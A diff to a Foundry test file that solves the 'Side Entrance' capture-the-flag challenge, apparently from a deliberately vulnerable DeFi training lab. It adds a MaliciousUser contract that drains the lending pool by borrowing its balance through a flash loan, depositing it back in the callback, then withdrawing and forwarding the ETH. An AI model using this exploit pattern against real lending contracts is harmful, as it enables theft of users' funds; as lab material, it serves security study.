@@ -3,7 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +45,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        MaliciousUser attacker = new MaliciousUser(address(pool));
+        attacker.attack();
+        attacker.sendToRecovery(recovery);
     }
 
     /**
@@ -53,6 +55,36 @@ contract SideEntranceChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
     }
+}
+
+contract MaliciousUser is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    function attack() public {
+        uint256 amountOfPool = address(pool).balance;
+        pool.flashLoan(amountOfPool);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: address(this).balance}();
+    }
+
+    function sendToRecovery(address _recovery) public {
+        pool.withdraw();
+
+        (bool sucsess, ) = _recovery.call{value: address(this).balance}("");
+        require(sucsess, "Send failed");
+    }
+
+    receive() external payable {}
 }
